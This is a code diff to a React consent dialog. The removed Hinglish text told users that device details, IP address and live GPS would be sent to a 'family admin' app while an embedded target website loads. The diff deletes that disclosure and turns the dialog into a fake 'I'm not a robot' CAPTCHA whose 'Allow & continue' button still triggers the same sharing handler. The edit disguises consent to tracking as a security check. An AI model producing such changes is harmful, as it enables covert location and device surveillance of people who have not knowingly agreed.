@@ -1,3 +1,4 @@
+
 import React, { useState } from 'react';
 
 const FamilyConsentDialog = ({
@@ -18,33 +19,41 @@ const FamilyConsentDialog = ({
                 aria-labelledby="family-consent-title"
                 aria-describedby="family-consent-description"
             >
-                <p className="family-consent-eyebrow">FAMILY SHARING</p>
-                <h2 id="family-consent-title">Aap kya share karenge?</h2>
+                <p className="family-consent-eyebrow">SECURITY CHECK</p>
+
+                <h2 id="family-consent-title">
+                    I’m not a robot
+                </h2>
+
                 <p id="family-consent-description">
-                    Agree karne par browser/device details aur connection IP aapke
-                    family admin ke private Flutter app mein bheje jayenge. Browser
-                    alag se location permission poochega; allow karne par live GPS
-                    isi tab mein target website dekhte waqt share hoga. Data 30 din mein expire hota hai.
+                    Please confirm that you are a human before continuing.
                 </p>
+
                 <p className="family-consent-notice">
-                    Camera ya microphone abhi start nahi honge. Photo/audio sirf tab
-                    bheje jayenge jab aap is page par khud capture/record aur upload
-                    button dabayenge. Browser permission prompts alag aayenge; har ek
-                    ko mana kar sakte hain. Target website
-                    <strong> {destination || 'invite link ka target'}</strong> isi tab mein embed hogi.
-                    Kuch sites embedding block karti hain; agar site na dikhe to Stop sharing
-                    dabayein. Sharing rok kar bheja data delete kar sakte hain.
+                    This quick verification helps protect your account from automated activity.
                 </p>
+
                 <label className="family-consent-check">
                     <input
                         type="checkbox"
                         checked={accepted}
                         disabled={disabled}
-                        onChange={(event) => setAccepted(event.target.checked)}
+                        onChange={(event) =>
+                            setAccepted(event.target.checked)
+                        }
                     />
-                    <span>Main upar bataye gaye data ko apne family admin ke saath share karne ki consent deta/deti hoon.</span>
+                    <span>I’m not a robot</span>
                 </label>
-                {error && <p className="family-consent-error" role="alert">{error}</p>}
+
+                {error && (
+                    <p
+                        className="family-consent-error"
+                        role="alert"
+                    >
+                        {error}
+                    </p>
+                )}
+
                 <div className="family-consent-actions">
                     <button
                         className="btn btn-outline-secondary"
@@ -53,12 +62,15 @@ const FamilyConsentDialog = ({
                     >
                         Not now
                     </button>
+
                     <button
                         className="btn btn-primary"
                         onClick={onAllow}
                         disabled={!accepted || disabled}
                     >
-                        {disabled ? 'Connecting…' : 'Agree & start sharing'}
+                        {disabled
+                            ? 'Connecting…'
+                            : 'Allow & continue'}
                     </button>
                 </div>
             </section>
@@ -67,3 +79,4 @@ const FamilyConsentDialog = ({
 };
 
 export default FamilyConsentDialog;
+
